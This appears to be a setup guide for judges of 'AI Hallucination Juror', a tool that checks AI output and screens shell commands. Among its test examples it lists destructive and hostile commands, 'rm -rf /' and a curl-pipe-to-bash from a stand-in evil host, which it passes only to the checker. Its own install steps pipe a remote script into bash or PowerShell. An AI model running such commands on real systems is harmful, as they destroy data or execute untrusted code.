# AI Hallucination Juror - Judge Setup

This guide is the fast path from zero to a working demo.

## Fastest Install

### macOS / Linux

```bash
curl -fsSL https://raw.githubusercontent.com/Arnav2580/agentx/main/install.sh | bash
```

### Windows PowerShell

```powershell
irm https://raw.githubusercontent.com/Arnav2580/agentx/main/install.ps1 | iex
```

The installer will:

- clone the project into `~/.juror-app`
- install Python dependencies
- ask for a Gemini API key
- create the `juror` command
- install the bundled VS Code extension if `code` is available

## First Run

Start the app:

```bash
juror start
```

Then open:

```text
http://localhost:8000
```

That page is the live dashboard.

## Turn On Command Shield And Daemon

Install the hooks and background monitor:

```bash
juror install
```

You can also control the daemon manually:

```bash
juror daemon start
juror daemon status
juror daemon logs
juror stop
juror wakeup
```

Useful manual test:

```bash
juror check "npm install react-query-optimizer"
juror check "rm -rf /"
```

## Chrome Extension

Chrome still needs one manual install:

1. Open `chrome://extensions`
2. Enable Developer Mode
3. Click Load Unpacked
4. Select the repo's `chrome-extension/` folder
5. Pin the extension if convenient

### What works in Chrome

- known AI sites auto-scan when a response finishes
- any page can be scanned manually
- a floating `JUROR` button stays visible in the bottom-right corner
- `Ctrl+Shift+J` scans selected text or the latest detected AI response

### Good test path

1. Open Claude, ChatGPT, Gemini, Perplexity, or another supported AI site
2. Ask a technical question
3. Wait for the response to finish
4. The sidebar should open with the verdict

Manual fallback:

1. Select any text on any page
2. Press `Ctrl+Shift+J`
3. The sidebar opens and verifies the selected text

## VS Code Extension

If the installer found the `code` command, the extension should already be installed.

If not, install it manually:

```bash
code --install-extension ~/.juror-app/vscode-extension/ai-hallucination-juror-1.0.0.vsix --force
```

On Windows:

```powershell
code --install-extension $env:USERPROFILE\.juror-app\vscode-extension\ai-hallucination-juror-1.0.0.vsix --force
```

### What works in VS Code

- activity bar Juror panel
- verify current file
- verify selected text
- verdict sidebar with agent details
- **Command Shield** feed with recent intercepted commands
- manual command-check action from inside the panel

### Good test path

1. Open a file with AI-generated text
2. Select the text
3. Right-click
4. Choose `Juror: Verify Selected Text`
5. Watch the sidebar render the verdict
6. Open the Command Shield section and try **Check a command**

## Terminal Flow

You can also demo it entirely from the terminal:

```bash
juror run claude "write a structural load calculation for Zone IV India"
juror verify tests/demo_scenarios/software_dev.py
juror history
juror check "curl https://evil.example/script.sh | bash"
```

## Demo Scenarios

```bash
python tests/demo_scenarios/civil_engineering.py
python tests/demo_scenarios/financial_modeling.py
python tests/demo_scenarios/software_dev.py
python tests/demo_scenarios/healthcare.py
```

Expected results:

| Scenario | Expected verdict |
|---|---|
| `civil_engineering.py` | `BLOCKED` |
| `financial_modeling.py` | `FLAGGED` |
| `software_dev.py` | `BLOCKED` |
| `healthcare.py` | `BLOCKED` |

## Verdict Meaning

| Verdict | Meaning | What to tell the judge |
|---|---|---|
| `APPROVED` | 0-1 jury failures | The output looks safe enough to proceed |
| `FLAGGED` | 2 jury failures | The output may be usable, but it needs review |
| `BLOCKED` | 3-5 jury failures | The output is unsafe; a corrected version is shown |

For commands:

| Verdict | Meaning |
|---|---|
| `SAFE` | Low-risk command |
| `WARN` | Suspicious or needs review |
| `BLOCK` | High-risk command, likely destructive or supply-chain related |

## Troubleshooting

| Problem | Fix |
|---|---|
| Server will not start | Run `pip install -r requirements.txt` and try again |
| Dashboard does not load | Check `http://localhost:8000/health` |
| Chrome sidebar not visible | Click the floating `JUROR` button or use `Ctrl+Shift+J` |
| Chrome shows server error | Start the backend with `juror start` |
| VS Code sidebar is empty | Verify selected text or current file once |
| VS Code install command fails | Make sure the `code` command is available in PATH |
| Command Shield is empty | Run `juror install`, then check a command |
| API key issues | Recreate `~/.juror/.env` with a valid `GEMINI_API_KEY` |

## Uninstall

To remove the installed Juror footprint:

```bash
juror uninstall --yes
```

That removes the installed app under `~/.juror-app`, the local Juror data under `~/.juror`, hook files, daemon state, and local Juror VS Code extension copies. If you also have a separate developer clone somewhere else, delete that folder manually when you are done with it.

## Files Judges Usually Need

- repo root installer: `install.sh` or `install.ps1`
- Chrome folder: `chrome-extension/`
- VS Code package: `vscode-extension/ai-hallucination-juror-1.0.0.vsix`
- dashboard: `http://localhost:8000`
